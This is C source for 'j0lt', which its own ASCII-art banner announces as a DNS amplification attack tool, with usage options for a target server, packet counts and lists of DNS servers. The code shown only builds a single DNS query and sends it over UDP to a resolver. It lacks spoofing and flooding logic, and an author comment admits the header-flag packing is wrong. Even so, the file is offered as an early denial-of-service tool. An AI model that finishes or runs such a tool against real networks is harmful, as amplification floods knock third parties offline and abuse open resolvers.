/*
 * ref: rfc 1034 & 1035
 */

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h> 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> 
#include <arpa/inet.h>

#include <netdb.h>
#include <unistd.h>

const char* g_ansi = {
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒                   ▒░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░                 ░░░░░░░░░░░░░░░░░░░░░░ ░░░░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓ ░"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓▓░░░░ ░░░░░▒▒░   ▓▓▓▓▓▓▓▓   "
    "░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░          ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ░"
    "░░░░░▓▓▓▓▓▓▓▓▓▓ ░░░░░░  ▓▓▓            ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░"
    "░░░░▒▓▓▓▓▓▓▓▓▓▓ ░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ░░"
    "░░░░▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓     ▓▓▓▓▓▓▓▓         ▓░░"
    "░░░░   ▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░"
    "░░░░░░░▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓░ ░░░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░"
    "░░░░░░░ ▓▓▓ ▓▓▓▓▓▓▓▓           ▓▓▓▓ ▓▓▓▓▓▓▓▓▓  ░░░░░░░░▓▓▓▓▓▓▓▓▓ ░░░░░░░░░░"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓▓             ▓▓▓ ▓▓▓▓▓▓▓▓  ░░░░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓              ▓▓ ▓▓▓▓▓▓▓▓▓▓▓  ▓░░░░░░ ▓▓▓▓▓▓▓▓ ▓░░░░░░░░░"
    "░░░░░░░░▓▓ ▓▓▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓░▓▓▓▓▓▓▓▓▓  ░░░░░░░░░"
    "▓▓▓░░ ▓▓▓▓▓ ▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▒░░▓▓▓▓▓▓▓▓  ░░░░░░░░░"
    "▓▓▓▓▓▓▓▓▓▓▓ ▓▓                     ▓▓▓    ▓▓▓▓▓▓▓   ░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░"
    "▓▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓▓  ░░        ░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░"
    "▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓   ░░░░░░░░░░░░░░░░░▒   ░     ░░░░░░░░░"
    "              ░  ▓            ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░"
    "░░▓      ░░░░░░░░           ▓▓ ░    ░░░░░    ░░░░░    ░░░░░░░░░░░░░░░░░░░░░"
    "░░░░░░░░░░░░░░░░                ░░░░░░░                   ░░░░░            "
    "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      "
    "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        "
    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target server          "
    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            "
    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -n <num>        : num UDP packets to send"
    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░ -r <dns rcrd>   : list of dns records    "
    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░ -s <dns srv>    : list of dns servers    "
    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░ -P <dns port>   : dns port (53)          "
    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░                                          "
    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         "
    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         "
    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░░                                          "
    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     "
    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com"
};

#ifndef __BYTE_ORDER 
#define 	__LITTLE_ENDIAN 0x1
#define 	__BYTE_ORDER __LITTLE_ENDIAN
#endif // __BYTE_ORDER

// HEADER VALUES 
#define 	ID 0x1337
#define 	QR 0 // query (0), response (1).
// OPCODE VALS 
#define 	OP_QUERY  0 // standard query (QUERY)
#define 	OP_IQUERY 1 // inverse query (IQUERY)
#define 	OP_STATUS 2 // server status (STATUS)
#define 	OPCODE    OP_QUERY
// END OPCODE
#define 	AA 0 // Authoritative Answer
#define 	TC 0 // TrunCation
#define 	RD 0 // Recursion Desired 
#define 	RA 0 // Recursion Available
#define 	Z  0 // Reserved
#define 	AD 0 // dns sec
#define 	CD 0 // dns sec
// RCODE
#define 	RC_NO_ER   0
#define 	RC_FMT_ERR 1
#define 	RC_SRVR_FA 2
#define 	RC_NAME_ER 3
#define 	RC_NOT_IMP 4
#define 	RC_REFUSED 5
#define 	RCODE      RC_NO_ER
// END RCODE
#define 	QDCOUNT 0x0001 // num entry question
#define 	ANCOUNT 0x0000 // num RR answer
#define 	NSCOUNT 0x0000 // num NS RR 
#define     ARCOUNT 0x0000 // num RR additional
// END HEADER VALUES

struct __attribute__((packed, aligned(1))) J0LT_HEADER {
    uint16_t	id : 16;
#if __BYTE_ORDER == __BIG_ENDIAN
    // third byte
    uint16_t	qr : 1;
    uint16_t	opcode : 4;
    uint16_t	aa : 1;
    uint16_t	tc : 1;
    uint16_t	rd : 1;
    // fourth byte
    uint16_t	ra : 1;
    uint16_t	z : 1;
    uint16_t	ad : 1;
    uint16_t	cd : 1;
    uint16_t	rcode : 4;
#endif
#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    // third byte
    uint16_t	rd : 1;
    uint16_t	tc : 1;
    uint16_t	aa : 1;
    uint16_t	opcode : 4;
    uint16_t	qr : 1;
    // fourth byte
    uint16_t	rcode : 4;
    uint16_t	cd : 1;
    uint16_t	ad : 1;
    uint16_t	z : 1;
    uint16_t	ra : 1;
#endif
    // remaining bytes
    uint16_t	qdcount : 16;
    uint16_t	ancount : 16;
    uint16_t	nscount : 16;
    uint16_t	arcount : 16;
};

// TYPE
#define 	T_A      1 // host address
#define 	T_NS     2 // authoritative name server
#define 	T_MD     3 // mail destination
#define 	T_MF     4 // mail forwarder
#define 	T_CNAME  5 // canonical name for alias
#define 	T_SOA    6 // start of zone authority
#define 	T_MB     7 // mailbox domain name
#define 	T_MG     8 // mail group member
#define 	T_MR     9 // mail rename domain name
#define 	T_NULL   10 // null RR
#define 	T_WKS    11 // service description
#define 	T_PTR    12 // a domain name pointer
#define 	T_HINFO  13 // host information
#define 	T_MINFO  14 // mail list information
#define 	T_MX     15 // mail exchange
#define 	T_TXT    16 // text strings
#define 	QT_AXFR  252 // transfer of entire zone
#define 	QT_MAILB 253 // mailbox records 
#define 	QT_MAILA 254 // req mail agent RRs
#define 	QT_ALL   255 // req all records
#define 	QTYPE    T_A
// CLASS values
#define 	C_IN   1 // the Internet
#define 	C_CS   2 // the CSNET class
#define 	C_CH   3 // the CHAOS class
#define 	C_HS   4 // Hesiod [Dyer 87]
#define 	QC_ALL 255 // anyclass
#define 	QCLASS C_IN

#define DEFINE_INSERT_FN(typename, datatype)           \
        bool insert_##typename                         \
        (uint8_t** buf, size_t* buflen, datatype data) \
    {                                                  \
        uint64_t msb_mask, lsb_mask,                   \
            bigendian_data, lsb, msb;                  \
        size_t byte_pos, nbits;                        \
                                                       \
        if (*buflen < 1) {                             \
            return false;                              \
        }                                              \
                                                       \
        nbits = sizeof(data) << 3;                     \
        bigendian_data = 0ULL;                         \
        byte_pos = (nbits / 8) - 1;                    \
        lsb_mask = 0xffULL;                            \
        msb_mask = lsb_mask << nbits - 8;              \
                                                       \
        byte_pos = byte_pos << 3;                      \
        for (int i = nbits >> 4; i != 0; i--) {        \
            lsb = (data & lsb_mask);                   \
            msb = (data & msb_mask);                   \
            lsb <<= byte_pos;                          \
            msb >>= byte_pos;                          \
            bigendian_data |= lsb | msb;               \
            msb_mask >>= 8;                            \
            lsb_mask <<= 8;                            \
            byte_pos -= (2 << 3);                      \
        }                                              \
                                                       \
        data = bigendian_data == 0 ?                   \
            data : bigendian_data;                     \
        for (int i = sizeof(data);                     \
             *buflen != -1 && i > 0; i--) {            \
            *(*buf)++ = (data & 0xff);                 \
            data >>= 8;                                \
            (*buflen)--;                               \
        }                                              \
                                                       \
        return data == 0;                              \
    }                                                  \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

#define 	DEBUG   1
#define 	BUF_MAX 0x200

int
connect_client(const char* server, const char* port,
           struct sockaddr_in* addr);
bool
insert_question(void** buf, size_t* buflen,
        const char* domain,
        uint16_t query_type,
        uint16_t query_class);
bool
InsertData(void** dst, size_t* dst_buflen,
        const void* src, size_t src_len);
bool
insert_header(uint8_t** buf, size_t* buflen,
          const struct J0LT_HEADER* header);
bool
create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
          const struct J0LT_HEADER* header,
          const char* domain,
          uint16_t query_type,
          uint16_t query_class);
int
main(int argc, char** argv) {
    struct sockaddr_in addr;
    int sockfd;
    size_t buflen = BUF_MAX;
    uint8_t pktbuf[ BUF_MAX ];
    struct J0LT_HEADER header = {
    ID,
    RD, TC, AA, OPCODE, QR,
    RCODE, CD, AD, Z, RA,
    QDCOUNT,
    ANCOUNT,
    NSCOUNT,
    ARCOUNT
    };

#if DEBUG
    printf("ID: %.4x\n\n", header.id);

    printf("rd: 0x%x\n", header.rd);
    printf("tc: 0x%x\n", header.tc);
    printf("aa: 0x%x\n", header.aa);
    printf("op: 0x%x\n", header.opcode);
    printf("qr: 0x%x\n", header.qr);
    printf("rc: 0x%x\n", header.rcode);
    printf("cd: 0x%x\n", header.cd);
    printf("ad: 0x%x\n", header.ad);
    printf("z : 0x%x\n", header.z);
    printf("ra: 0x%x\n\n", header.ra);

    printf("QDCOUNT: 0x%.4x\n", header.qdcount);
    printf("ANCOUNT: 0x%.4x\n", header.ancount);
    printf("NSCOUNT: 0x%.4x\n", header.nscount);
    printf("ARCOUNT: 0x%.4x\n", header.arcount);
#endif // DEBUG

    if (argc != 4) {
        fprintf(stderr,
            "<resolver> <resolver port> <target>\n");
        exit(EXIT_FAILURE);
    }

    if (create_dns_packet(pktbuf, &buflen,
        &header, argv[ 3 ],
        QTYPE, QCLASS) == false) {
        fprintf(stderr, "create_dns_packet error\n");
        exit(EXIT_FAILURE);
    }

    sockfd = connect_client(argv[ 1 ], argv[ 2 ], &addr);
    if (sockfd == -1) {
        fprintf(stderr, "connect_client error\n");
        exit(EXIT_FAILURE);
    }

    sendto(sockfd, pktbuf, BUF_MAX - buflen, 0,
       ( const struct sockaddr* ) &addr,
       sizeof(addr));
    close(sockfd);

    return 0;
}

bool
create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
          const struct J0LT_HEADER* header,
          const char* domain,
          uint16_t query_type,
          uint16_t query_class) {
    uint8_t* curpos = pktbuf;
    bool status = true;

    status &= insert_header(&curpos, buflen, header);
    status &= insert_question(( void** ) &curpos,
                  buflen, domain,
                  query_type, query_class);

    return status;
}

bool
insert_header(uint8_t** buf, size_t*
          buflen, const struct J0LT_HEADER* header) {
    bool status = true;
    uint8_t third_byte;
    uint8_t fourth_byte;

    // This is real wrong.... 
    third_byte = (header->rd | header->tc |
           header->aa | header->opcode |
           header->qr);

    fourth_byte = (header->rcode | header->cd |
           header->ad | header->z |
           header->ra);

    status &= insert_word(buf, buflen, header->id);

    status &= insert_byte(buf, buflen, third_byte);
    status &= insert_byte(buf, buflen, fourth_byte);

    status &= insert_word(buf, buflen, header->qdcount);
    status &= insert_word(buf, buflen, header->ancount);
    status &= insert_word(buf, buflen, header->nscount);
    status &= insert_word(buf, buflen, header->arcount);

    return status;
}

bool
insert_question(void** buf, size_t* buflen,
        const char* domain, uint16_t query_type,
        uint16_t query_class) {
    const char* token;
    char* saveptr, qname[ BUF_MAX ];
    size_t srclen, domainlen;
    bool status;

    domainlen = strlen(domain) + 1;
    if (domainlen > BUF_MAX - 1) {
        return false;
    }

    memcpy(qname, domain, domainlen);
    if (qname[ 0 ] == '.') {
        insert_byte(( uint8_t** ) buf, buflen, 1);
        InsertData(buf, buflen, qname, 1);
    }
    else {
        token = strtok_r(qname, ".", &saveptr);
        if (token == NULL) {
            return false;
        }
        while (token != NULL) {
            srclen = strlen(token);
            insert_byte(( uint8_t** ) buf, buflen, srclen);
            InsertData(buf, buflen, token, srclen);
            token = strtok_r(NULL, ".", &saveptr);
        }
    }

    status = true;
    status &= insert_byte(( uint8_t** ) buf,
              buflen, 0x00);
    status &= insert_word(( uint8_t** ) buf,
              buflen, query_type);
    status &= insert_word(( uint8_t** ) buf,
              buflen, query_class);

    return status;
}

bool
InsertData(void** dst, size_t* dst_buflen,
        const void* src, size_t src_len) {
    if (*dst_buflen < src_len) {
        return false;
    }

    memcpy(*dst, src, src_len);
    *dst += src_len;
    *dst_buflen -= src_len;

    return true;
}

int
connect_client(const char* server, const char*
           port, struct sockaddr_in* addr) {
    int udp_socket;
    uint16_t port_uint16;

    errno = 0;
    port_uint16 = ( uint16_t ) strtol(port, NULL, 0);
    if (errno != 0) {
        perror("port error: strtol");
        exit(EXIT_FAILURE);
    }

    memset(addr, 0, sizeof(addr));

    addr->sin_family = AF_INET;
    addr->sin_port = htons(port_uint16);
    addr->sin_addr.s_addr = inet_addr(server);

    udp_socket = socket(AF_INET, SOCK_DGRAM, 0);

    return udp_socket;
}
